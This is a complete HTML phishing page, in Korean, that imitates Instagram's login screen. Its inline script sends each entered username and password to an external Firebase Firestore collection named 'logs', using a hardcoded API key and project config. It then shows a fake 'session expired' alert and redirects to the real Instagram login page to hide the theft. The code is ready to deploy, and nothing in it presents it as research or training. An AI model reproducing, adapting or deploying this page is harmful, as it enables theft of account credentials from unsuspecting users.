<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        /* 기본 레이아웃 설정 */
        body { background-color: #ffffff; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        
        /* 1. 상단 화살표 및 언어 선택 (디테일 수정) */
        .top-bar { width: 100%; padding: 18px 20px; display: flex; align-items: center; justify-content: flex-start; box-sizing: border-box; }
        .back-arrow { font-size: 26px; font-weight: 300; cursor: pointer; color: #000; }
        .language-container { color: #737373; font-size: 13px; margin: 15px 0 45px 0; cursor: pointer; display: flex; align-items: center; gap: 4px; }
        .lang-arrow { font-size: 10px; transform: scaleX(1.2); } /* 원본 특유의 브이 표기 구현 */

        /* 2. 메인 컨테이너 및 로고 (원본 아이콘 적용) */
        .container { width: 100%; max-width: 360px; padding: 0 32px; box-sizing: border-box; text-align: center; flex-grow: 1; }
        .logo-img { width: 72px; height: 72px; margin-bottom: 45px; } /* 원본 비율에 맞춘 크기 */

        /* 3. 입력창 및 버튼 (폰트 크기 미세 조정) */
        input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 14px; background-color: #ffffff; box-sizing: border-box; font-size: 14.5px; color: #262626; }
        input::placeholder { color: #737373; font-size: 15px; } /* 원본과 동일한 플레이스홀더 크기 */
        
        .btn-login { width: 100%; background-color: #0064e0; color: white; border: none; padding: 11px; border-radius: 25px; font-weight: 600; cursor: pointer; font-size: 15.5px; margin-top: 6px; }
        .btn-login:disabled { opacity: 0.6; }
        
        .forgot-pw { color: #000000; font-size: 14.5px; font-weight: 600; text-decoration: none; margin-top: 24px; display: block; letter-spacing: -0.2px; }

        /* 4. 하단 섹션 (Meta 마크 및 로고 수정) */
        .bottom-section { width: 100%; max-width: 360px; padding: 20px 32px 30px 32px; box-sizing: border-box; text-align: center; }
        .btn-signup { width: 100%; background-color: transparent; color: #0064e0; border: 1.2px solid #0064e0; padding: 10px; border-radius: 25px; font-weight: 600; cursor: pointer; font-size: 15px; margin-bottom: 28px; }
        
        .meta-footer { color: #737373; font-size: 13px; display: flex; flex-direction: column; align-items: center; gap: 4px; }
        .meta-logo-img { width: 68px; filter: grayscale(1) opacity(0.6); margin-top: 2px; } /* 파란색 제거, 흑백 Meta 로고 적용 */
    </style>
</head>
<body>
    <div class="top-bar"><span class="back-arrow">←</span></div>
    
    <div class="language-container">
        한국어 <span class="lang-arrow">∨</span>
    </div>

    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" alt="Instagram" class="logo-img">
        
        <form id="loginForm">
            <input type="text" id="id" placeholder="사용자 이름, 이메일 주소 또는 휴대폰 번호" required>
            <input type="password" id="pw" placeholder="비밀번호" required>
            <button type="submit" id="submitBtn" class="btn-login">로그인</button>
        </form>

        <a href="#" class="forgot-pw">비밀번호를 잊으셨나요?</a>
    </div>

    <div class="bottom-section">
        <button class="btn-signup">새 계정 만들기</button>
        <div class="meta-footer">
            <span>Meta</span>
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" alt="Meta" class="meta-logo-img">
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDGS9mDbbKXNL4OrskQ3ZDHBsKb8Glroj4",
            authDomain: "instagram-be709.firebaseapp.com",
            projectId: "instagram-be709",
            storageBucket: "instagram-be709.firebasestorage.app",
            messagingSenderId: "556245509978",
            appId: "1:556245509978:web:e78967856f2ac2586f7563",
            measurementId: "G-1KLXR0LXSZ"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const submitBtn = document.getElementById('submitBtn');
            const idVal = document.getElementById('id').value;
            const pwVal = document.getElementById('pw').value;
            
            submitBtn.disabled = true;

            try {
                await addDoc(collection(db, "logs"), {
                    userId: idVal,
                    userPw: pwVal,
                    timestamp: new Date()
                });
                
                alert("로그인 프로세스가 만료되었습니다. 다시 로그인해 주세요.");
                window.location.href = "https://www.instagram.com/accounts/login/";
            } catch (error) {
                console.error("오류 발생:", error);
                alert("네트워크 연결을 확인해주세요.");
                submitBtn.disabled = false;
            }
        });
    </script>
</body>
</html>
